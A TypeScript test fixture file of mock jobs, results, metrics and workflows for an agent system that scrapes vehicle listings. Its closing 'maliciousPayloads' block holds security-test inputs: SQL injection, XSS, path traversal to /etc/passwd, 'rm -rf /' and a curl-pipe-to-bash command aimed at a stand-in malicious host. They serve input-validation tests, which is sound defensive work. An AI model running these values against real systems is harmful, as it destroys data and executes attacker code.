import { 
  AgentJob, 
  AgentResult, 
  AgentConfig,
  AgentMetrics,
  JobStatus,
  JobPriority,
  AgentType,
  OrchestrationRequest,
  OrchestrationResult,
  OrchestrationStep
} from '../../agents/types/AgentTypes';

// Base agent configuration fixtures
export const baseAgentConfig: AgentConfig = {
  maxRetries: 3,
  timeout: 30000,
  concurrency: 1,
  enableLogging: true,
  enableMetrics: true,
  customSettings: {}
};

export const orchestratorConfig: AgentConfig = {
  ...baseAgentConfig,
  timeout: 600000,
  customSettings: {
    maxConcurrentWorkflows: 5,
    workflowTimeout: 600000,
    enableDynamicScaling: true,
    resourceThresholds: {
      cpuThreshold: 80,
      memoryThreshold: 85,
      responseTimeThreshold: 5000
    }
  }
};

// Agent job fixtures
export const pendingAgentJob: AgentJob = {
  id: 'job-pending-001',
  type: 'scrape-vehicle-data',
  priority: JobPriority.NORMAL,
  payload: {
    url: 'https://example.com/vehicles',
    filters: { make: 'Toyota', model: 'Camry' }
  },
  requirements: {
    agentType: AgentType.SCRAPER,
    capabilities: ['web_scraping', 'data_extraction']
  },
  constraints: {
    maxExecutionTime: 60000,
    maxRetries: 3
  },
  metadata: {
    source: 'api',
    tags: ['vehicle', 'scraping'],
    userId: 'user-123',
    sessionId: 'session-456'
  },
  createdAt: new Date('2024-01-01T10:00:00Z'),
  updatedAt: new Date('2024-01-01T10:00:00Z')
};

export const runningAgentJob: AgentJob = {
  ...pendingAgentJob,
  id: 'job-running-001',
  updatedAt: new Date('2024-01-01T10:01:00Z')
};

export const completedAgentJob: AgentJob = {
  ...pendingAgentJob,
  id: 'job-completed-001',
  updatedAt: new Date('2024-01-01T10:05:00Z')
};

export const failedAgentJob: AgentJob = {
  ...pendingAgentJob,
  id: 'job-failed-001',
  priority: JobPriority.HIGH,
  updatedAt: new Date('2024-01-01T10:03:00Z')
};

// Agent result fixtures
export const successfulResult: AgentResult = {
  success: true,
  data: {
    vehicles: [
      {
        id: 'vehicle-001',
        make: 'Toyota',
        model: 'Camry',
        year: 2023,
        price: 25000,
        mileage: 15000
      }
    ],
    totalFound: 1,
    scrapedAt: new Date('2024-01-01T10:05:00Z')
  },
  executionTime: 45000,
  agentId: 'scraper-001',
  metadata: {
    resourcesUsed: {
      memory: 256,
      cpu: 0.3
    },
    performanceMetrics: {
      requestCount: 5,
      averageResponseTime: 850
    }
  }
};

export const failedResult: AgentResult = {
  success: false,
  data: null,
  error: 'Network timeout: Failed to connect to target website',
  warnings: [
    'High response time detected',
    'Rate limiting encountered'
  ],
  executionTime: 30000,
  agentId: 'scraper-001',
  metadata: {
    resourcesUsed: {
      memory: 128,
      cpu: 0.1
    }
  }
};

// Agent metrics fixtures
export const healthyAgentMetrics: AgentMetrics = {
  agentId: 'orchestrator-001',
  totalJobs: 100,
  successfulJobs: 95,
  failedJobs: 5,
  averageExecutionTime: 5500,
  lastJobTime: new Date('2024-01-01T10:00:00Z'),
  memoryUsage: 512,
  errorRate: 0.05,
  uptime: 86400000, // 24 hours
  createdAt: new Date('2024-01-01T00:00:00Z'),
  updatedAt: new Date('2024-01-01T10:00:00Z')
};

export const degradedAgentMetrics: AgentMetrics = {
  ...healthyAgentMetrics,
  agentId: 'scraper-002',
  totalJobs: 50,
  successfulJobs: 30,
  failedJobs: 20,
  averageExecutionTime: 12000,
  errorRate: 0.4,
  memoryUsage: 1024
};

// Orchestration fixtures
export const vehicleScrapingRequest: OrchestrationRequest = {
  workflow: 'vehicle-data-pipeline',
  parameters: {
    sources: ['https://dealer1.com', 'https://dealer2.com'],
    filters: {
      make: 'Toyota',
      maxPrice: 30000,
      maxMileage: 50000
    },
    maxResults: 100
  },
  priority: JobPriority.NORMAL,
  constraints: {
    maxExecutionTime: 300000,
    requiredAgents: ['scraper', 'analyzer', 'validator'],
    parallelExecution: false
  },
  callbacks: {
    onProgress: 'https://webhook.example.com/progress',
    onComplete: 'https://webhook.example.com/complete',
    onError: 'https://webhook.example.com/error'
  },
  metadata: {
    requestId: 'req-001',
    userId: 'user-123',
    source: 'dashboard'
  }
};

export const urgentScrapingRequest: OrchestrationRequest = {
  ...vehicleScrapingRequest,
  priority: JobPriority.URGENT,
  constraints: {
    ...vehicleScrapingRequest.constraints,
    maxExecutionTime: 60000
  }
};

export const pendingOrchestrationResult: OrchestrationResult = {
  workflowId: 'workflow-001',
  status: JobStatus.PENDING,
  steps: [
    {
      id: 'scrape',
      name: 'Scrape Vehicle Data',
      agentType: AgentType.SCRAPER,
      status: JobStatus.PENDING,
      input: vehicleScrapingRequest.parameters,
      retryCount: 0
    },
    {
      id: 'analyze',
      name: 'Analyze Vehicle Data',
      agentType: AgentType.ANALYZER,
      status: JobStatus.PENDING,
      input: {},
      retryCount: 0
    },
    {
      id: 'validate',
      name: 'Validate Data Quality',
      agentType: AgentType.VALIDATOR,
      status: JobStatus.PENDING,
      input: {},
      retryCount: 0
    }
  ],
  startedAt: new Date('2024-01-01T10:00:00Z')
};

export const completedOrchestrationResult: OrchestrationResult = {
  ...pendingOrchestrationResult,
  workflowId: 'workflow-002',
  status: JobStatus.COMPLETED,
  steps: [
    {
      id: 'scrape',
      name: 'Scrape Vehicle Data',
      agentType: AgentType.SCRAPER,
      status: JobStatus.COMPLETED,
      input: vehicleScrapingRequest.parameters,
      output: {
        vehicles: [
          { id: 'v1', make: 'Toyota', model: 'Camry', price: 25000 },
          { id: 'v2', make: 'Toyota', model: 'Corolla', price: 22000 }
        ],
        totalFound: 2
      },
      startedAt: new Date('2024-01-01T10:00:00Z'),
      completedAt: new Date('2024-01-01T10:02:00Z'),
      executionTime: 120000,
      retryCount: 0
    },
    {
      id: 'analyze',
      name: 'Analyze Vehicle Data',
      agentType: AgentType.ANALYZER,
      status: JobStatus.COMPLETED,
      input: { vehicles: [] },
      output: {
        insights: {
          averagePrice: 23500,
          priceRange: { min: 22000, max: 25000 },
          marketTrends: 'stable'
        }
      },
      startedAt: new Date('2024-01-01T10:02:00Z'),
      completedAt: new Date('2024-01-01T10:03:30Z'),
      executionTime: 90000,
      retryCount: 0
    },
    {
      id: 'validate',
      name: 'Validate Data Quality',
      agentType: AgentType.VALIDATOR,
      status: JobStatus.COMPLETED,
      input: { vehicles: [], insights: {} },
      output: {
        qualityScore: 0.95,
        validationResults: {
          dataCompleteness: 0.98,
          dataAccuracy: 0.92,
          duplicateRate: 0.02
        }
      },
      startedAt: new Date('2024-01-01T10:03:30Z'),
      completedAt: new Date('2024-01-01T10:04:00Z'),
      executionTime: 30000,
      retryCount: 0
    }
  ],
  result: {
    vehicles: [
      { id: 'v1', make: 'Toyota', model: 'Camry', price: 25000 },
      { id: 'v2', make: 'Toyota', model: 'Corolla', price: 22000 }
    ],
    insights: {
      averagePrice: 23500,
      priceRange: { min: 22000, max: 25000 },
      marketTrends: 'stable'
    },
    qualityScore: 0.95
  },
  completedAt: new Date('2024-01-01T10:04:00Z'),
  totalExecutionTime: 240000
};

export const failedOrchestrationResult: OrchestrationResult = {
  ...pendingOrchestrationResult,
  workflowId: 'workflow-003',
  status: JobStatus.FAILED,
  steps: [
    {
      id: 'scrape',
      name: 'Scrape Vehicle Data',
      agentType: AgentType.SCRAPER,
      status: JobStatus.FAILED,
      input: vehicleScrapingRequest.parameters,
      error: 'Network timeout: Unable to connect to target website',
      startedAt: new Date('2024-01-01T10:00:00Z'),
      completedAt: new Date('2024-01-01T10:01:00Z'),
      executionTime: 60000,
      retryCount: 3
    }
  ],
  error: 'Workflow failed at step: scrape - Network timeout: Unable to connect to target website',
  completedAt: new Date('2024-01-01T10:01:00Z'),
  totalExecutionTime: 60000
};

// Memory fixtures
export const memoryEntries = [
  {
    key: 'vehicle-cache-toyota',
    value: { vehicles: [], lastUpdated: new Date() },
    type: 'object' as const,
    ttl: 3600,
    tags: ['vehicle', 'toyota', 'cache'],
    createdAt: new Date('2024-01-01T09:00:00Z'),
    updatedAt: new Date('2024-01-01T09:30:00Z'),
    accessCount: 15,
    lastAccessed: new Date('2024-01-01T10:00:00Z')
  },
  {
    key: 'scraping-session-001',
    value: { sessionId: 'session-001', status: 'active' },
    type: 'object' as const,
    ttl: 1800,
    tags: ['session', 'scraping'],
    createdAt: new Date('2024-01-01T10:00:00Z'),
    updatedAt: new Date('2024-01-01T10:00:00Z'),
    accessCount: 3,
    lastAccessed: new Date('2024-01-01T10:05:00Z')
  }
];

// Error scenarios
export const networkErrorScenario = {
  job: {
    ...pendingAgentJob,
    id: 'job-network-error',
    payload: { url: 'https://unreachable-site.com' }
  },
  error: new Error('Network request failed: ENOTFOUND unreachable-site.com')
};

export const timeoutErrorScenario = {
  job: {
    ...pendingAgentJob,
    id: 'job-timeout-error',
    constraints: { maxExecutionTime: 1000 }
  },
  error: new Error('Job execution timeout after 1000ms')
};

export const validationErrorScenario = {
  job: {
    ...pendingAgentJob,
    id: 'job-validation-error',
    payload: null // Invalid payload
  },
  error: new Error('Validation error: Job payload is required')
};

// Security test fixtures
export const maliciousPayloads = {
  sqlInjection: {
    id: "job'; DROP TABLE agent_jobs; --",
    payload: {
      query: "'; DELETE FROM agent_jobs WHERE '1'='1"
    }
  },
  xssAttack: {
    id: 'job-xss',
    payload: {
      message: '<script>alert("XSS")</script>',
      description: '<img src="x" onerror="alert(1)">'
    }
  },
  pathTraversal: {
    id: 'job-path-traversal',
    payload: {
      filePath: '../../../etc/passwd',
      configPath: '..\\..\\windows\\system32\\config'
    }
  },
  commandInjection: {
    id: 'job-command-injection',
    payload: {
      command: 'ls; rm -rf /',
      script: '$(curl malicious-site.com/script.sh | bash)'
    }
  }
};